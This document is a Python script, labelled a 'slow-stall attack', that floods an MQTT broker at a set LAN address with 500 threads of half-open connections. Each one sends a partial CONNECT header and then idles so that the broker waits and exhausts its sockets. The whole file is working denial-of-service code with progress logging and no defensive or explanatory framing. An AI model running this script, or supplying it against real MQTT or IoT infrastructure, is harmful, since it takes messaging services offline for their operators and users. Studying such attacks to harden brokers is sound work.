import socket
import time
import threading
from datetime import datetime

# --- TARGET CONFIGURATION ---
TARGET_IP = "192.168.1.181"
TARGET_PORT = 1883
THREADS = 500 
# ----------------------------

active_connections = 0
lock = threading.Lock()

def get_time():
    return datetime.now().strftime("%H:%M:%S")

def stall_attack(thread_id):
    global active_connections
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((TARGET_IP, TARGET_PORT))
            
            # 0x10 = CONNECT Fixed Header
            # 0x64 = 100 bytes (Remaining Length)
            # We tell the broker "A 100-byte packet is starting!"
            s.send(b"\x10\x64") 
            
            with lock:
                active_connections += 1
                if active_connections % 5 == 0:
                    print(f"[{get_time()}] ⚡ Strength: {active_connections} sockets squatting.")
            
            # Now we just sit here. The broker is waiting for the 100 bytes.
            time.sleep(45) 
            
            s.close()
            with lock: active_connections -= 1
        
        except Exception as e:
            if "Too many open files" in str(e):
                print(f"[{get_time()}] [!] ATTACKER LIMIT: Your OS blocked the socket.")
                time.sleep(5)
            time.sleep(1)

if __name__ == "__main__":
    print("-" * 50)
    print(f"[*] SLOW-STALL ATTACK STARTING ON {TARGET_IP}")
    print("-" * 50)

    for i in range(THREADS):
        threading.Thread(target=stall_attack, args=(i,), daemon=True).start()
        time.sleep(0.05)

    try:
        while True:
            time.sleep(5)
            print(f"[{get_time()}] [HEARTBEAT] {active_connections} connections active.")
    except KeyboardInterrupt:
        print("\n[!] Attack stopped.")